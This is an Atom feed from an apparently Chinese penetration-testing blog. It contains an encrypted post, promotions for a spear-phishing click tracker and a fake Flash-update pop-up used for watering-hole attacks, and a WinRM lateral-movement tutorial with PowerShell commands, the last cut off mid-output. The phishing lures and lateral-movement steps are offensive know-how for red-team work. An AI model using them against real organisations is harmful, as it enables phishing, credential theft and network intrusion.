<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Se7en&#39;s Blog|资深apt install专家。</title>
  
  
  <link href="https://www.se7ensec.cn/atom.xml" rel="self"/>
  
  <link href="https://www.se7ensec.cn/"/>
  <updated>2020-11-18T14:12:42.130Z</updated>
  <id>https://www.se7ensec.cn/</id>
  
  <author>
    <name>Se7en</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一星期实战总结（四）</title>
    <link href="https://www.se7ensec.cn/2020/11/17/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%934/"/>
    <id>https://www.se7ensec.cn/2020/11/17/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%934/</id>
    <published>2020-11-17T02:30:24.000Z</published>
    <updated>2020-11-18T14:12:42.130Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="9212e7bcc9773eac75915c692479fcd9ec2bbbf7ef93723fdcbd0bc855697240">79368b25fc99414eb5e6dd35b8823418ba9f2b00aaf622961808809d1588f3fb4d5201407f02b9e2c3d007f1b7bf65977da4dd88e5240cef21dd34abb8fae99f0a8d9d28711e46239440271eb8061870b69e54f553aac97172c643e36c05dede807be2f5915d1b3b2feae3a562b3f2800638d51031f6d854527c33ddc6826346bc5b81a3cd8125e794b23758fce2b899d40584d3c6894da116de3d76adb605717bd0ef6280430261869d0bd38b4a11ed62d782f73b99b51a91172b0db846fbf09974c256001885cf118dd65686890048cc9cfe005385556623d5c0f21b5b56621821d9c40126cbc722381db6ac77c4e7551a45bd326b5ca1c7f7972830c0cba577c61b1a1f20d692d354210e4e412b4e8dfb0fc623df5003e9e36209ffddb6e694b21f4704b919d77b677b6a25d829c9ad215121e4c4bddaacbbb4c0ac0a92da82b06eb06755e3e008f3d6cca47436dc6d2e228a6450d37b398e7dd0e681d07d26011294b85db2cdda3888d03d8ed02a35847d93744f4682ef24fec73f5b8b5e3ef78b74685d80d4822aca0eec472d498a094ed3ad9e4fe4539a05b53e5230e662aa9bbc141dffde2786436294ee69aaccde0b3abdc3c54eeda9fae3613421da705b207e41802d688ad75e7b9d6a458d50a89f4f4017a0be557025b43fd80cb758de19300713255baee39a2605056a721cc292b8ccae57f4ca8d1d381a6d9659ee8c8759e4f699b40cf14aed429e0b38ab30e57346f21e6d677f04be503f71e8e17addaa5e5d727901f31d95993d4a31e6dfb62f523278aee142f602f04fda3bf300eaf5b22bd2acd65a582d9aea8b7b6aa539a9289209a3c83ad9da2bcb7fe0b9e2ffc249cf587601c12e54c8e265a780373af4d876a2d891af478865a3dde5cab4c1dbf73ead626f88688730fa7c84138309354893fb3b7b243b7658c5ef4e468cf3b33da74ee2e606c5947117c0ac11aae4ee8caed135e3847bdecb2a6162bfdee647ea008b5f689cf570071d43eb3c1b89af9c42dbd0e22b521d7157d2637f6d0e694fc517eb0547cddf1b6b2ab75ab3e9d4bd2f1b28bb11a32e6473f185081db5ea44d94cb221a6bdf4184ad55c13dd8e2bc2e41fb007d868eea7c8f130c50a0a73a2c9584816338fe7b8633bb360bb6daeb2b7613fb91e35047336c0743989e7e60404a767715438f3244343a54cac59dd6fa1c6a7165e7659c4e0019755b2e962f60bfe6bb622356ae0af10ea7663825bf622367054973aa0d7882a7144127bf92a1a5648777d9018ec1884612a25b3df224bebe13b47324e383c958f1bba82bb4f686796440ad81ea0445f454ba45192027d2684546b1794f5ac1d9ec236d7f828da58d5dce9370f7eb559e9da9e7631e45a4a4aec2f2b5d2be5a53d0b8e0ca300c1166e26688256959a24309eaf7643eab9b0eadb33c7a5120ad253b6819c8bc40ea4e10e4eeb5dd359bce335b6b9b5b16ca73606c75778ca7b8cb3e84e1fab42716e40114ab04d7f7b3635e6f3a25267132b9c10242c1b596534526f90e45d8a80cfb74aed4926c60c52956a7577c6ae78a0a4d888dcea24d1a5771bf0d9bc887d8f977ebfb9e2c5327643dd01b98faa86b54e14e18ceeaa68cecf410a15a98ddea64d6d738962e027b831ee6bdedc78b8e9569063b9fdce1d5ce88a81008b7891ac6881a4626d0c135a30cc4a945eb035c75e867e0436cf420370f364dcbe0130c239623f5794efb4cea5b2b1ba022931e60464e637a0e7daf3dccddcd586b97eff469e743296604bf6fe289fa76c280347807fceb45fc0ac11306bbcbabfba677f23f9ee8c7efc92248b8937d7e5138777a4668b84526e7055f6dc3acec21a6c98bbff96e115b3855161607821132ceaf85a22094094681a7edcf097b8bd09c01886a759886f55c3b366908bfbdd43997259de9ba909ff2f3355ee47ad6127b2b3bba31ce2224f33528e033fb5392cb9da008b5f3ba21737210ca2cef5c15e29360ab5be0eaae3a3a6a4df402684af557392f33047fab1d79e13d29f76a630eef8525cd8ccd79c9002fde940480262cb35cffb7b3af5cf523c93bdcb634271eb8fffd1602008dc59d7ee6d8806446966f0b320b5a963e733d5c4a800260a6b4963ab5131c187ad383cd50fa16df960dda211c1d64ca01a277064991252d3db5adc0d4866b893195d268491f9b9a9b9a7a6f73a860c68c3003a9ba88ce30467afee0fa5c566f0144e0c2910d7838405638dd1ec1eb1d8ada25adb52ef3078ab5c28ec145cc9378c9f3968f4917476b581b2f94baa0bcc3d1fca2fe0f97c2afd8f30aff5ff7fdf35fab81729aab71a4d366af5127f67f2ce0072120da8cef81cf9ae7bc3e87c1b6abbfbe1810591bf81b33f1b9c8935118372b21f59bfe13f30591a9105420f0e214eb95ddadd938bb24ec71124aa73c9dcd73bb9b67619ea857347d5effca25050a60f2559a1e47952b2e01b7ce0c30a9f9258002ac98497257c5f12d482c8c7497bcb1161df20930428cadd42d33d99e34d7431a205a0e801320a29f1e4e374c61a07e95c66ee70b5b95b591b6a0828304e86078a1b8bf3ff00d6a6bdfb9dfe272ce37c533c9a22b28a1013ad35b6658231382165231dae7c0e014ed9133f8bd777f1f40cb01d7d2daffd0db6e0b14ae49b11f83a62cabcded34a2062b83ea603e57afbaa214a8f501b5ef259157e82cb27e61e91158ff9f3560a6556f5b6bfc2b08c8e6010666ba56b1bedb81ec564e69daf35f968a3f78035b9923c133a13334829c727012e735ec616d42c531826296c279f196193c9ea70d5becb9e28c11e590a26b059129c3ed0ae889a903b847cb43467f54b3378385ce3f1f788cc5b407a3749ba4adb81470427f18a4af503156e56095fd297a44cff32db7d05bd351b3dba528374319df030e48fdc2485408e4a2744314249f1c08feb1790623c95c96885c41a3810a1ef195e876a3056cb707e18977ba823633a56aebca1025130f46f06b17bc8181b4fc532082f7b5c64c3f037b85535a28a81423b4802115f27ee2f3a58d92c763526ce37ea20ea7b157b15bd82c18caa58ae668480c4d758b958f5be69c42d311971d243e1250919a4ef0424032b2575574ac9c409c800953d44edd01a45a61c77a421523da215a2831ab8748ad766a05800c65e10815cf883b77e777cfe0fe1c6e2410ebee9947589a25260fc353490a7482e44a94433ee7dea9b0644dd3dd3bd495934b76aa60da9d078fff2a7f84d0b1dbaed49bf5dff109290291db8d7b380544a7bfc889fc23e13ede7e59b695ac53325d84be70005bbffe4f00e90ec4b5b4bd9be1420f514c38bc64a730133b7734c4d2841442dffb7a4f06cf5ecd03a85baaca646f63b7971cbca71aa22b0dbda7b0510123af935591fd222a329fc7099b8bb864898a09e0b68e0faf15a9fa5f4d3fcd4dafcfa5b5453d73c4591137331297a2579c0252aab7da788fbf897a8554b94b916633c2888ea50a7a75f23f731f0e2bb42318269416c67a76bd84fecbc6fe84a7319710d7ac4c082e60060303771653e0f3cecef1651db4fdefaa9dbe89a824c5df05914b394626623b42cda3d2b346a01e386d6beb5b07cf4690fdc410924f0dd68edc7f5244747ca7f4ebbb61fd470c13a6038282da54be34e7843972bfc6169055523bd7332faed44a737e65c38e0b55f9a38c8b9063a03a400cb49def45b06a505011ff17093da17950f07e59cd915f0810788017f2ab726185ec4ae9ffde7662f3b2dc2f1318399ed1bab3eeb16ca604dd500923d11b671e38efcbdfb294c70f7e37abef0cb757881dbdf6262b28810408f14ba6e119c26d5d3fe32356537f1687b5e04ad2f75f6b33ed9f3395718c5b871c8a2e54e286775346c163cee4c3b96e789bb21b4799c02afb9c1494e69d5ef8507709f927d04a5a33362ed9efe2e61f2d6ae69c1fdc865457ec6154106a6ed6c1ae92fcb25de7d0d782dc9e47424cf05644f5c52c100071f5fbd862cde6dab8812f188a4accc4147ee25bf38d9b13b51072a7b6574aab2036a0fcf9c16c08656d832cbea696ea142e1a2a5056498b9aba326869ba689cf69f48d96844b366dc6ce57c18b6bf451eb79ab8ae53c0c5d537f9d38a2cf75b9799dfa652af8be03c7b9d6e9c3e9160600a44aadac7a255378d227eb8e29526efec637eaf0a70675df52b9d4b84439d49fca922618e16afd646d1b26b62c0d121cb0e2943bd36f0a7176eeb82ad33032678ac251a5e9f788ea4b6d2b0fe4e1babd918850ad4f5d5ce5d4089c6dbcb09bc42c25596ae329270e44e7242f88860d3957b552d8651697e8cf0a5b2d6c328c9d61c665c3a15b3742296cb25ebae4be9d089a19c89a83629b042684679a1b6260f6c1026666718be8c94cbcb4b9a23cbcecb31ecc477d97941d6e6b06dbbb7652d3465d91fd658ed7fa56eb0811017163343fe42e99b14c3c60b5c816bc85e3283bea748be0beab3d4463135a4e850005e43fdfffc8eac5256c6f868557eb72ef60dc56eb04bdec819cb0a5e8310a598c9815a3afb559528fd4abc5424b203305eca2a0a9af5a7da9f17a6d6a26d222bac8d3997459e7308cc97c71d88cd549555b8bb17dbc7a4ca121aefb7c76ba0c8b86142f6e2d136bb87c1cdab2e4eb1319c28552beb0bdc2d2b165786c51beec2d6d1deaee98dad84ddd704ec2c52f77b1ad6c9d7ba08b5e6a7556abb22142fb8af36540a7543bf0e2b6fb097c74de8e0ca005d95e34afe7f9d144f5c8f8e181c1d1ed10778f152c3b3ebb73134c76e9dc27b150adef142c01c14e2457617daa6bf6c55605590e6368255ba1bfc27c2b11be42c9e137c8983a3d75d7f938467ec95612dfbb283abf92607f0a2f65eb2ee2b991d9e40532558188910baf021e548ee51c5f67eab10ff4ef257c4c543776beb5c00eb2845c06a1041115cad95391aaecefff46780301e2f822941af8987e7ecda135c735ae5de3edc2dba9d839fe937361afac5885a451e966a61fe4f6651b1d798f1c93d339c02ca3b7d0b1afcf9098220258ef480cf42b22ead6dd4f876f86215e9e6ed202402bc9e27a531b370a62ac07703dfe2cf7b6e599c1c570de0c71da97f8a2897d6de419e3e804069a54d7b53cd2812ad8d6e8eff90064fd7922bd2abd018d36599aa134666feb2c157d4bf1fd7ee4b4d1656958560994204058830824b3075c4dcc29043fc5524c5d5046633a30d8b5f3817df70fec2e2c140ca430a9cfcb0c8ede32b233260df98cdc9dc7d0b670924659633bed67959f7812c11711d746454670eec3e770d06bf1355fbb7153705314511c2b12cc003e2c1eb4d519f9cedfed9c367beecc1106945492eb51f69fc5b2efd69028a1999b478b750c8b09f0e2fa25a4ba2872fd801b87e3a64ae6503f2a0c6bc350c150e7a52b05589f44cfee0532231f4fb6266242f975ae39a3868513f6dc1699ea953be21254f1ebc38be75f66b3f3a782e3aa07646005bb570dfd57ac11b01ad620e2b0564f70f42cc761ddecfefb10166a1261f3d95e01c3b8ed85d7d48b4d3b241eafc9b556c08746e09879dafbba846f7ba410681463fd4ab2ef2bb11b7aed26bd3d3365191739be6b40c6592828f5f947ce237430029e73d721105ccdcab140b53c930aea97f58da211679d2ef44efaba464b03a9b759a491db41039a487e0ec8dcebc2eac724fa084401b14312c28c68c9c71bb19d2ac9262b5b4b5dbdf96c288d33bf619968d2df42f0708dd0925d1cb720874c56a49f8f9bac02f0f1b6dfdcf26b2795ee520b3cc72b6f6865458b5096dec29bdd1afea5cc56e0f55f9c409633078fc86167e41cab8887cc77ee2be5ac81e20befe32bcfb16b08732ecf4d7734bcd8376182ddfb161553d7bf911f67003dc6350bd160a1b4f3450a4ae476f295b2425f6ae8fec0a933e9a1fd103027dd7799cd4a692786906fd1273b49b71a288cafa73898af58839f9e51e555804c30d60fd6d444960a0bd23397c7f2bc06fa558af24955556ce2db1ef6da2731d8ffe3332166678db27d92ccd4ad1cc41886c8faea4fa675d7a5529e5cddad4b26e2c15486176ccd743f6e920e97e4c4117770740290751a51290c6d8f7c7eb05fc6ec44bbf24c20790d550ed7998fd539fb8af23aef0b1b94579ec99988a613325aa6389dc3e231adca82b6e05fe3e09bd6a1fb1d04f011a7a1789cd741ec7f8a5f6038952c02afe7d648880afeac17690171ac636600fe071178b809dd74f227c834fc2c7d1ede4ceb38701eae3b5d8b6753feded4f6750449c82789eefa941cbcce82bb7bfe795d31b368fec499d9456841bf77422e0ca89a7904f352a4558337a36e986178e30a94d1b0679e75aab25e8ff78019725d85783610cb58a64e0d1ae0f9569a23a98a023f3b1099d1c5cd8cd3b2a831b7645ba594ecfa1dfb2af880fa82cbd7d780098f7492286e263c643d1620f3131ff8c39b1072c7b8ca95f23bd766f57a4dfb4c8d1bc5606a1ba02a4a94bb0d93c8497d474f10b30c1541985420c4240269be01466b5be3f20ec02b4a914f5ba2935306cbd19c7ebfaf9031872db55e4e16c7213270fef14df1d4cdef43a5b78ce476b0a22ef895e949e295e66cbc7c8c8d287cd8eca83d42bf4c9d11c4d2cd2e61d969508948993026ffd5cf41dcfe4608d0a6ccc303ea0dfe3ff8e2e6a18146d7f599b542909984b72469890cc305282e20ecd515fcbb3b70b3d4094b08ba0dae506fede19acf4969cd389fa259d30c989c1b962dce077abac168d23d7444b847119006d68be642965b79969931d20b32912d5a228a711a4fe54c4095bd525fd7634fc70f57bee55f9e57f1be0277f7e70ae59ec5c03135228f149a8ebc26477f3cf3f4f919b254bfe53711c8e06b5c12ef2dbdf86bab56b5da1b5d1bd6a520578193e8b8e06a25767317fc8b1131c1b8e2fe0900211addf7954d9660f0fa6c1244500af19828b8bf02fb0e3de12a694fb5ddb5f5a7c8fd68724ead867ddd5303eaddcb9a500fbd7a8bf41d0cccf8fe46a5c9054bb7ec0ba1b95cbde71402070771208442f3370232aef3c787fff576389a20c82440f4391c6c0b5551bf24d91412a6fe7d73a5a51e37ab6d9703599f13e1ecbc8049fed5903ce70b036b0c2c7f1082b7d3e40d7d2c65</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="一星期实战总结" scheme="https://www.se7ensec.cn/tags/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>鱼叉攻击|Mail-Probe 邮箱探针后台管理系统</title>
    <link href="https://www.se7ensec.cn/2020/09/30/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Mail-Probe%E9%82%AE%E7%AE%B1%E6%8E%A2%E9%92%88%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
    <id>https://www.se7ensec.cn/2020/09/30/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Mail-Probe%E9%82%AE%E7%AE%B1%E6%8E%A2%E9%92%88%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</id>
    <published>2020-09-30T04:10:24.000Z</published>
    <updated>2020-11-14T19:54:03.459Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>好的鱼竿和诱饵固然重要，但真正把鱼儿和渔夫联系起来的是小小的浮漂。</p></blockquote><a id="more"></a><h1 id="效果预览"><a href="#效果预览" class="headerlink" title="效果预览"></a>效果预览</h1><p>平常去河边钓鱼，要使用浮漂才会知道这条河是否有鱼吃饵料，同理当邮件投递出去后，此探针可以判断目标是否点击了邮件，不至于那么的苦等。</p><h2 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h2><p><img src="https://raw.githubusercontent.com/r00tSe7en/Mail-Probe/master/tz0.png"></p><h2 id="信息查看"><a href="#信息查看" class="headerlink" title="信息查看"></a>信息查看</h2><p><img src="https://raw.githubusercontent.com/r00tSe7en/Mail-Probe/master/tz1.png"></p><h2 id="链接生成"><a href="#链接生成" class="headerlink" title="链接生成"></a>链接生成</h2><p>本程序通过php中的readfile() 函数读取本地图片，如使用自定义图片请替换public目录下的info.png，这里的图片可以使用目标公司的logo。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/Mail-Probe/master/tz2.png"></p><h1 id="配置相关"><a href="#配置相关" class="headerlink" title="配置相关"></a>配置相关</h1><blockquote><p>基于ThinkPHP 6开发</p></blockquote><blockquote><p>运行环境要求Apache和PHP7.1+</p></blockquote><blockquote><p>数据库文件为mail.sql</p></blockquote><p>数据库及其他配置修改env文件即可，默认为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">APP_DEBUG &#x3D; false</span><br><span class="line"></span><br><span class="line">[APP]</span><br><span class="line">DEFAULT_TIMEZONE &#x3D; Asia&#x2F;Shanghai</span><br><span class="line"></span><br><span class="line">[DATABASE]</span><br><span class="line">TYPE &#x3D; mysql</span><br><span class="line">HOSTNAME &#x3D; 127.0.0.1</span><br><span class="line">DATABASE &#x3D; mail</span><br><span class="line">USERNAME &#x3D; root</span><br><span class="line">PASSWORD &#x3D; root</span><br><span class="line">HOSTPORT &#x3D; 3306</span><br><span class="line">CHARSET &#x3D; utf8</span><br><span class="line">DEBUG &#x3D; false</span><br><span class="line"></span><br><span class="line">[LANG]</span><br><span class="line">default_lang &#x3D; zh-cn</span><br></pre></td></tr></table></figure><p>后台默认账号密码（密码修改直接替换库中MD5即可）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin|123456</span><br></pre></td></tr></table></figure><h1 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h1><a href="https://github.com/r00tSe7en/Mail-Probe">  <img align="center" src="https://github-readme-stats.vercel.app/api/pin/?username=r00tSe7en&theme=dracula&repo=Mail-Probe" /></a><h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><p><a href="https://github.com/c1y2m3">@c1y2m3</a> 分享的思路</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;好的鱼竿和诱饵固然重要，但真正把鱼儿和渔夫联系起来的是小小的浮漂。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="JavaScript" scheme="https://www.se7ensec.cn/tags/JavaScript/"/>
    
    <category term="PHP" scheme="https://www.se7ensec.cn/tags/PHP/"/>
    
    <category term="鱼叉攻击" scheme="https://www.se7ensec.cn/tags/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>水坑攻击|Flash钓鱼弹窗优化版</title>
    <link href="https://www.se7ensec.cn/2020/09/14/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB-Flash%E9%92%93%E9%B1%BC%E5%BC%B9%E7%AA%97%E4%BC%98%E5%8C%96%E7%89%88/"/>
    <id>https://www.se7ensec.cn/2020/09/14/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB-Flash%E9%92%93%E9%B1%BC%E5%BC%B9%E7%AA%97%E4%BC%98%E5%8C%96%E7%89%88/</id>
    <published>2020-09-14T04:10:24.000Z</published>
    <updated>2020-11-14T19:54:40.488Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>还是那句话：Flash永远滴神~</p></blockquote><a id="more"></a><p>一直想写个界面精致点的Flash钓鱼，奈何各种效果实现起来实在是有点麻烦，正好发现了layer这个牛逼的弹层组件，一开始直接用的图片，几行代码就搞定了，但是还是不够完美，后来发到T00ls大家集思广益，提出了一些非常好的建议，几次修改后才有了如下的最终版。</p><p>在线预览：<a href="http://flash-pop.se7ensec.cn/">http://flash-pop.se7ensec.cn/</a></p><p>有人说flash不好用了，感觉分析好对面是干啥的，做好一些自动化、定制化的工作，上线率其实还是挺高的。</p><p>项目地址：<a href="https://github.com/r00tSe7en/Flash-Pop">https://github.com/r00tSe7en/Flash-Pop</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;还是那句话：Flash永远滴神~&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="JavaScript" scheme="https://www.se7ensec.cn/tags/JavaScript/"/>
    
    <category term="HTML" scheme="https://www.se7ensec.cn/tags/HTML/"/>
    
    <category term="水坑攻击" scheme="https://www.se7ensec.cn/tags/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|基于winRM的横向移动</title>
    <link href="https://www.se7ensec.cn/2020/08/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewinrm%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>https://www.se7ensec.cn/2020/08/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewinrm%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2020-08-26T14:10:24.000Z</published>
    <updated>2020-11-14T19:55:13.677Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>基于winRM的横向移动</p></blockquote><a id="more"></a><h2 id="winRM简介"><a href="#winRM简介" class="headerlink" title="winRM简介"></a>winRM简介</h2><p>WinRM(Windows Remote Management)是 Microsoft 对 WS-Management 协议的实现，WS-Management 协议即一种基于标准简单对象访问协议（soap）的防火墙友好协议，它让来自不同供应商的硬件和操作系统能够相互操作。windows 众多可以远程执行命令方式中的一种。 </p><p>作为DCOM和WMI远程管理的替代方法，WinRM用于通过WSMan与远程计算机建立会话，WSMan利用HTTP/S作为传输机制来传递XML格式的消息。在现代Windows系统中，WinRM HTTP通过TCP端口5985进行通信，而HTTPS（TLS）通过TCP端口5986进行通信。</p><p>WinRM本机支持NTLM和Kerberos（域）身份验证。初始身份验证后，WinRM会话将使用AES加密（<a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/winrmsecurity?view=powershell-7">Microsoft Docs</a>）保护。</p><p>注意：必须配置并运行WinRM服务才能接受远程连接。WinRM接受连接可能还需要几个步骤。请参阅这篇 <a href="https://pentestlab.blog/2018/05/15/lateral-movement-winrm/">Pentest Lab 文章</a> 以了解更多信息。</p><p><strong>※ winRM横向移动同时适用于工作组和域环境。</strong> </p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><h3 id="通信的双方都需要开启WinRM服务"><a href="#通信的双方都需要开启WinRM服务" class="headerlink" title="通信的双方都需要开启WinRM服务"></a>通信的双方都需要开启WinRM服务</h3><p>WinRS 适用于 Win server 2008 / Win7 及以后的系统，但是 Win server 2008 / PC 全版本系统默认关闭。</p><p>只有在Win server 2012 之后的版本的WinRM服务才默认启动并监听了5985端口，允许远程任意主机来管理。</p><p>WinRM状态查询</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> win32_service | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.name <span class="operator">-like</span> <span class="string">&quot;WinRM&quot;</span>&#125;                    </span><br><span class="line"></span><br><span class="line">ExitCode  : <span class="number">1077</span></span><br><span class="line">Name      : WinRM</span><br><span class="line">ProcessId : <span class="number">0</span></span><br><span class="line">StartMode : Manual</span><br><span class="line">State     : Stopped</span><br><span class="line">Status    : OK</span><br></pre></td></tr></table></figure><p>开启可以使用下面其中一条命令即可</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm quickconfig <span class="literal">-q</span> <span class="comment">#这条命令运行后会自动添加防火墙例外规则，放行5985端口。</span></span><br><span class="line"><span class="built_in">Enable-PSRemoting</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure><p>再次查询</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> win32_service | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.name <span class="operator">-like</span> <span class="string">&quot;WinRM&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">ExitCode  : <span class="number">0</span></span><br><span class="line">Name      : WinRM</span><br><span class="line">ProcessId : <span class="number">1128</span></span><br><span class="line">StartMode : Auto</span><br><span class="line">State     : Running</span><br><span class="line">Status    : OK</span><br></pre></td></tr></table></figure><h3 id="服务端防火墙允许WinRM服务端口通信"><a href="#服务端防火墙允许WinRM服务端口通信" class="headerlink" title="服务端防火墙允许WinRM服务端口通信"></a>服务端防火墙允许WinRM服务端口通信</h3><p>默认为5985、5986；如果5985打开，但是5986关闭，标识WinRM服务配置为仅接受HTTP连接。修改默认端口可以使用如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/Listener?Address=*+Transport=HTTP <span class="selector-tag">@</span>&#123;Port=<span class="string">&quot;80&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="WinRM通信两端配置要求"><a href="#WinRM通信两端配置要求" class="headerlink" title="WinRM通信两端配置要求"></a>WinRM通信两端配置要求</h3><p>1）查看WinRM具体配置</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm get winrm/config</span><br></pre></td></tr></table></figure><p>2）允许所有客户端IP连接</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/Client <span class="selector-tag">@</span>&#123;TrustedHosts=<span class="string">&quot;*&quot;</span>&#125;</span><br><span class="line">winrm e winrm/config/listener <span class="comment">#查看监听地址和端口</span></span><br></pre></td></tr></table></figure><h2 id="远程管理"><a href="#远程管理" class="headerlink" title="远程管理"></a>远程管理</h2><p>远程连接时可能会遇到以下错误</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Winrs error:WinRM 客户端无法处理该请求。可以在下列条件下将默认身份验证与 IP 地址结合使用: 传输为 HTTPS 或目标位于 TrustedHosts 列表中，并且提供了显式凭据。使用 winrm.cmd 配置 TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。 有关如何设置 TrustedHosts 的详细信息，请运行以下命令: winrm help config。</span><br><span class="line"></span><br><span class="line">Winrs error:WinRM 客户端无法处理该请求。如果身份验证方案与 Kerberos 不同，或者客户端计算机未加入到域中，则必须使用 HTTPS 传输或者必须将目标计算机添加到 TrustedHosts 配置设置。使用 winrm.cmd 配置 TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。 通过运行以下命令 可获得有关此内容的更多信息: winrm help config。</span><br></pre></td></tr></table></figure><p>在你的攻击机上执行下面这条命令，设置为信任所有主机，再去连接即可</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;winrm <span class="built_in">set</span> winrm/config/Client <span class="selector-tag">@</span>&#123;TrustedHosts=<span class="string">&quot;*&quot;</span>&#125;</span><br><span class="line"> Client</span><br><span class="line">    NetworkDelayms = <span class="number">5000</span></span><br><span class="line">    URLPrefix = wsman</span><br><span class="line">    AllowUnencrypted = false</span><br><span class="line">    Auth</span><br><span class="line">        Basic = true</span><br><span class="line">        Digest = true</span><br><span class="line">        